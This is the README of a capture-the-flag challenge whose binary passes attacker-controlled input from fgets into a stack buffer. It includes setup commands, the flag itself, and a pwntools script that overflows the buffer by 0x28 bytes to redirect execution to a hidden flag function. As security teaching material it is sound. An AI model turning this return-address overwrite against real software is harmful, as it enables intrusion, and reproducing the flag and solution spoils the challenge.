# I Want To Know More About You
Created by Tyr Rex.

To test locally:
- Run `docker compose up` in the directory to start the server.
- Then find the ip of the container with `docker inspect -f "{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}" IWantToKnowMoreAboutYou`
- Then connect to the server with `nc <DOCKER-CONTAINER-IP> 12001`

or use `ncat`:
```
# start the server
ncat -l -k -v -p 12001 -e ./server
# connect to the server
ncat localhost 12001
```

<details>
    <summary>Flag</summary>
    <code>flag{rop_this_rop_that_roppppp}</code>
</details>

## Files Provided
- `IWantToKnowMoreAboutYou`
- `IWantToKnowMoreAboutYou.c`

## Tools
- Python
- objdump

## Steps to Solve

<details>
<summary>Steps to Solve</summary>

In `IWanttoKnowMoreAboutYou.c` we see that the function `hmm()` will print out the flag, however the
program never runs that function. We can use ROP to call it.

When the program calls `fgets(buf, 0x40, stdin)`, we need to overflow the stack until it reaches the
saved instruction pointer. We need to overflow `char buf[0x20]` by `0x28` bytes, then write the
address of the function `hmm()` so that when the `greet()` calls `ret`, it pops `hmm()`'s address
instead and runs the function.

```py
from pwn import *

c = remote('172.21.0.2', 12001)
print(c.recv())
c.send(b'a' * 0x28 + b'\x55\x19\x40\x00\x00\x00\x00\x00\n')
print(c.recv())
```
</details>
